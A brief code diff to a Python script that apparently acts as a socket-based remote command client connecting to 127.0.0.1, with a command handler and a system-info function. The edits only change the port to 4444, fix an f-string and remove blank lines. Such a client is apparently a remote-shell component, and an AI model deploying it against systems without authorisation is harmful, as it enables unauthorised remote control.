@@ -8,7 +8,7 @@ import struct
 
 
 IP = "127.0.0.1"
-PORT = 4445
+PORT = 4444
 ARC = platform.system()
 
 def send(sock, data):
@@ -78,12 +78,9 @@ def handle_cmd(sock):
                 break
                 
     except Exception as e:
-        print("\nCommand handler error: {e}")
+        print(f"\nCommand handler error: {e}")
         sock.close()
         sys.exit(0)
-
-
-
 
 def gsi():
         try:
